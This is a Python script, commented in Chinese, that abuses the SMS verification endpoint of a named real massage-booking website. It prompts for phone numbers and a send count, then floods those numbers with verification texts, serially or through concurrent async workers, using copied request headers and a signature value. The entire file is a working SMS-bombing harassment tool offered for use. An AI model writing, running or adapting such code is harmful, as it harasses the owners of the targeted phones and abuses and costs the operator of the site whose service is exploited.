import json, time, asyncio, aiohttp, sys
from collections import Counter
URL = "https://am.yujiandaojia.com/index.php"
PARAMS = {"i": "666", "m": "longbing_massages_city",
          "s": "massage/app/IndexUser/sendShortMsg", "urls": "massage/app/IndexUser/sendShortMsg"}
HEADERS = {
    "Host": "am.yujiandaojia.com",
    "Connection": "keep-alive",
    "isapp": "2",
    "Content-Type": "application/json;charset=UTF-8",
    "autograph": "0addbf1b363d6ab8c820a0a66b798b92",
    "Accept": "*/*",
    "Origin": "https://am.yujiandaojia.com",
    "X-Requested-With": "com.tencent.mm",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://am.yujiandaojia.com/h5/?&code=0812EKml2yDTlg4y11ol2xepIA32EKmQ&state=STATE",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
}
def send_one(phone: str) -> bool:
    payload = {"phone": phone}
    try:
        import requests
        resp = requests.post(URL, params=PARAMS, headers=HEADERS, json=payload, timeout=5)
        if resp.status_code == 200 and resp.json().get("code") == 200:
            return True
    except Exception as e:
        print(f"[ERROR] {phone} -> {e}")
    return False

def run_serial(phone: str, times: int):
    ok = 0
    for i in range(1, times + 1):
        if send_one(phone):
            ok += 1
            print(f"[{i:03d}/{times}] {phone} 发送成功")
        else:
            print(f"[{i:03d}/{times}] {phone} 发送失败")
        time.sleep(0.2) 
    print(f"\n{phone} 完成，成功 {ok}/{times}")
async def async_send_one(session: aiohttp.ClientSession, phone: str) -> bool:
    payload = {"phone": phone}
    try:
        async with session.post(URL, params=PARAMS, headers=HEADERS, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            if resp.status == 200:
                data = await resp.json()
                if data.get("code") == 200:
                    return True
    except Exception as e:
        print(f"[ERROR] {phone} -> {e}")
    return False

async def worker(queue: asyncio.Queue, session: aiohttp.ClientSession, results: list):
    while True:
        item = await queue.get()
        if item is None:
            queue.task_done()
            break
        phone, idx, total = item
        ok = await async_send_one(session, phone)
        results.append((phone, ok))
        print(f"[{idx:03d}/{total}] {phone} {'成功' if ok else '失败'}")
        queue.task_done()

async def run_async(phones: list[str], times: int, workers: int = 5):
    queue = asyncio.Queue()
    results = []
    for p in phones:
        for i in range(1, times + 1):
            queue.put_nowait((p, i, times))
    async with aiohttp.ClientSession() as session:
        tasks = [asyncio.create_task(worker(queue, session, results)) for _ in range(workers)]
        await queue.join()
        for _ in tasks:
            await queue.put(None)
        await asyncio.gather(*tasks)
    c = Counter([p for p, ok in results if ok])
    for p in phones:
        print(f"{p} 成功 {c.get(p, 0)}/{times}")
def main():
    while True:
        phone_input = input("请输入手机号：").strip()
        phones = [p.strip() for p in phone_input.split(",") if p.strip()]
        if phones:
            break
        print("输入无效，请重新输入！\n")
    while True:
        times_input = input("发送次数：").strip()
        if times_input.isdigit() and int(times_input) >= 1:
            times = int(times_input)
            break
    if len(phones) > 1 or times > 20:
        asyncio.run(run_async(phones, times))
    else:
        run_serial(phones[0], times)

if __name__ == "__main__":
    main()
